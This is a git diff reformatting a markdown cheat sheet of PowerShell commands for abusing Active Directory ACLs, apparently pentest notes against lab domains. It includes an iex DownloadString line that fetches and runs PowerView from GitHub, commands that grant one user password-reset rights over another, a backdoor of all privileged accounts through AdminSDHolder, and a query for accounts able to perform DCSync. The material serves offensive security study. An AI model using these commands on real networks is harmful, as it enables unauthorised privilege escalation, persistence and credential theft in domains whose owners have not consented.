@@ -37,10 +37,9 @@ Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1
 Get-Command -Module ActiveDirectory
 ```
 
-### Commands
+### Enumerate ACLs without resolving GUIDs
 
 ```powershell
-# Enumerate ACLs without resolving GUIDs
 (Get-ACL 'CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local').Access
 ```
 
@@ -60,41 +59,70 @@ Import-Module .\PowerView.ps1
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
 ```
 
-### Commands
+### Get the ACLs associated with the specified Object
 
 ```powershell
-# Get the ACLs associated with the specified object
 Get-ObjectACL -SamAccountName "Users" -ResolveGUIDs
+```
 
-# Get the ACLs associated with the specified prefix to be used for search
+### Get the ACLs associated with the specified Prefix to be used for Search
+
+```powershell
 Get-ObjectACL -ADSPrefix 'CN=Administrator,CN=Users' -Verbose
+```
 
-# Get the ACLs associated with the specified LDAP path to be used for search
+### Get the ACLs associated with the specified LDAP Path to be used for Search
+
+```powershell
 Get-ObjectACL -ADSPath "LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local" -ResolveGUIDs -Verbose
+```
 
-# Search for interesting ACEs
+### Search for interesting ACEs
+
+```powershell
 Invoke-ACLScanner -ResolveGUIDs
+```
 
-# Get the ACLs associated with the specified path
+### Get the ACLs associated with the specified Path
+
+```powershell
 Get-PathACL -Path "\\dc01.lab.local\sysvol"
+```
 
-# Enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
+### Enumerate who has Rights to the 'matt' User in 'testlab.local', resolving Rights GUIDs to Names
+
+```powershell
 Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
+```
 
-# Grant user 'will' the rights to change 'matt's password
+### Grant User 'will' the Rights to change 'matt's Password
+
+```powershell
 Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
+```
 
-# Audit the permissions of AdminSDHolder, resolving GUIDs
+### Audit the Permissions of AdminSDHolder, resolving GUIDs
+
+```powershell
 Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
+```
 
-# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
+### Backdoor the ACLs of all privileged Accounts with the 'matt' Account through AdminSDHolder Abuse
+
+```powershell
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
+```
 
-# Retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
+### Retrieve *most* Users who can perform DC Replication for dev.testlab.local (i.e. DCsync)
+
+```powershell
 Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
     ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
 }
+```
 
-# Enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
+### Enumerate Permissions for GPOs where Users with RIDs of > -1000 have some kind of Modification/Control Rights
+
+```powershell
 Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
 ```
